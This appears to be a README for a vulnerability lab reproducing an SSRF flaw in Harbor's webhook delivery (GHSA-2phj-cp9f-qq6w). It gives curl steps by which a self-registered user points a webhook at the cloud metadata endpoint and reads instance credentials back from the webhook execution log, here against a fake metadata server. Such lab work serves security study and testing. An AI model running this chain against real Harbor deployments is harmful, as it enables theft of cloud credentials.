# harbor GHSA-2phj-cp9f-qq6w

| Type | Image | Notes |
| ---- | ----- | ----- |
| dqd | ghcr.io/ctrsploit/ghsa-2phj-cp9f-qq6w:latest | points to `v0.1.0` |
| dqd | ghcr.io/ctrsploit/ghsa-2phj-cp9f-qq6w:v0.1.0 | stock Harbor v2.15.2 (vulnerable) + fake IMDS on `169.254.169.254` |
| ctr | ghcr.io/ctrsploit/ghsa-2phj-cp9f-qq6w:ctr_v0.1.0 | - |

Reproduction environment for [GHSA-2phj-cp9f-qq6w](https://github.com/goharbor/harbor/security/advisories/GHSA-2phj-cp9f-qq6w) (no CVE alias): SSRF in Harbor webhook delivery. When a webhook policy is created, `validateTargets()` only checks that the address has an http/https scheme and parses — private, loopback, link-local and cloud-metadata addresses are all accepted, and jobservice later POSTs the stored address verbatim. With the default `project_creation_restriction: everyone`, any self-registered user can create a project (becoming its ProjectAdmin, which holds `NotificationPolicy:create`) and point a webhook at `http://169.254.169.254/...`. When the target answers with an error status, its response body is written to the webhook execution log, which any project member can read.

Affected: `>= 1.7.0, < 2.13.6` / `>= 2.14.0, < 2.14.5` / `>= 2.15.0, < 2.15.3`; fixed in v2.13.6 / v2.14.5 / v2.15.3 / v2.16.0 (repo advisory severity High 8.5, CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N). This lab `FROM`s the stock `harbor/v2.15.2` deployment and adds only the SSRF victim: a fake IMDS on `169.254.169.254` whose responses carry clearly-fake credentials. For the fixed behavior, run the same reproduction against `harbor/v2.15.3` — webhook creation to that address is rejected there.

The exploit is provided by the ctrsploit toolkit, not this lab image.

## usage

### Start and connect

Recommended:

```shell
$ dqd up vul/ghsa-2phj-cp9f-qq6w
$ ssh dqd-ghsa-2phj-cp9f-qq6w
```

Fallback without dqd CLI or SSH config:

```shell
$ cd vul/ghsa-2phj-cp9f-qq6w
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
$ ./ssh
```

The Harbor web UI and API are exposed on host port `21523`, with the official default credentials `admin` / `Harbor12345`:

```shell
$ curl -fsSL http://127.0.0.1:21523/api/v2.0/health
<!-- VERIFY -->
```

### reproduce

All commands run inside the VM over SSH.

1. Self-register an unprivileged user (self-registration is on by default) and create a project — its creator automatically becomes ProjectAdmin:

```shell
root@harbor-v2-15-2:~# curl -s -o /dev/null -w '%{http_code}\n' -X POST http://127.0.0.1/api/v2.0/users \
    -H 'Content-Type: application/json' \
    -d '{"username":"attacker","email":"attacker@example.com","realname":"attacker","password":"Attacker12345","comment":""}'
<!-- VERIFY -->
root@harbor-v2-15-2:~# curl -s -o /dev/null -w '%{http_code}\n' -u attacker:Attacker12345 -X POST http://127.0.0.1/api/v2.0/projects \
    -H 'Content-Type: application/json' \
    -d '{"project_name":"ssrf","metadata":{"public":"false"}}'
<!-- VERIFY -->
```

2. Create a webhook policy whose target is the link-local metadata endpoint. The `201 Created` is the bug — a link-local address is accepted without validation:

```shell
root@harbor-v2-15-2:~# curl -s -o /dev/null -w '%{http_code}\n' -u attacker:Attacker12345 -X POST \
    http://127.0.0.1/api/v2.0/projects/ssrf/webhook/policies \
    -H 'Content-Type: application/json' \
    -d '{"name":"ssrf-poc","description":"","enabled":true,"event_types":["PUSH_ARTIFACT"],"targets":[{"type":"http","address":"http://169.254.169.254/latest/meta-data/iam/security-credentials/harbor-instance-role","auth_header":"","skip_cert_verify":false}]}'
<!-- VERIFY -->
```

3. Push any image to fire the `PUSH_ARTIFACT` event (`127.0.0.0/8` is a default insecure registry for dockerd, so no daemon configuration is needed):

```shell
root@harbor-v2-15-2:~# docker login 127.0.0.1 -u attacker -p Attacker12345
<!-- VERIFY -->
root@harbor-v2-15-2:~# docker pull alpine:3.19 && docker tag alpine:3.19 127.0.0.1/ssrf/alpine:3.19 && docker push 127.0.0.1/ssrf/alpine:3.19
<!-- VERIFY -->
```

4. The fake IMDS received the delivery — jobservice POSTed to `169.254.169.254` from inside the deployment:

```shell
root@harbor-v2-15-2:~# tail -n 3 /var/log/fake-imds.log
<!-- VERIFY -->
```

5. The response body of the error-status delivery was written to the webhook execution log, which any project member (here: the unprivileged attacker) can read:

```shell
root@harbor-v2-15-2:~# curl -s -u attacker:Attacker12345 http://127.0.0.1/api/v2.0/projects/ssrf/webhook/policies/1/executions/1/tasks/1/log
<!-- VERIFY -->
```

### versions

```shell
root@harbor-v2-15-2:~# docker version
<!-- VERIFY -->
root@harbor-v2-15-2:~# curl -fsSL http://127.0.0.1/api/v2.0/systeminfo | grep -o '"harbor_version":"[^"]*"'
<!-- VERIFY -->
root@harbor-v2-15-2:~# cat /etc/os-release
<!-- VERIFY -->
root@harbor-v2-15-2:~# uname -a
<!-- VERIFY -->
```

## build

```shell
make all ENV=vul/ghsa-2phj-cp9f-qq6w
```

for developers:

```dockerfile
FROM ghcr.io/ctrsploit/ghsa-2phj-cp9f-qq6w:ctr_v0.1.0
```

* `FROM` the stock `harbor/v2.15.2` ctr image (published as `ctr_v0.1.21`); Harbor itself is untouched — the 9 containers start at VM boot exactly as in the base env. The only addition is `imds.service`, enabled at build time, which starts `/usr/local/bin/fake-imds.py` and installs two idempotent `iptables -t nat ... REDIRECT` rules.
* `169.254.169.254:80` is not bound directly — harbor's nginx publishes `0.0.0.0:80` in this VM, so a second port-80 bind would fail. Instead `PREROUTING` (traffic from the harbor containers) and `OUTPUT` (VM-local traffic) REDIRECT `169.254.169.254:80` to the fake server on `0.0.0.0:8169`; conntrack NATs the replies, so clients see the plain `http://169.254.169.254/...` URL.
* The fake IMDS answers GET on a known IMDSv1 path with `200`, and everything else with `404` — both carry the same (fake) credentials body. Per the advisory, error-status response bodies are what jobservice writes into the project-readable webhook execution log; this is the read-back channel the lab demonstrates.
* `SIZE=20G`, inherited from the base (Harbor's 9 containers plus PostgreSQL/Redis data).
* Debug the fake IMDS with `journalctl -u imds.service` and `iptables -t nat -S | grep 169.254`; ssh root/root 10.0.2.16 to debug the VM itself.
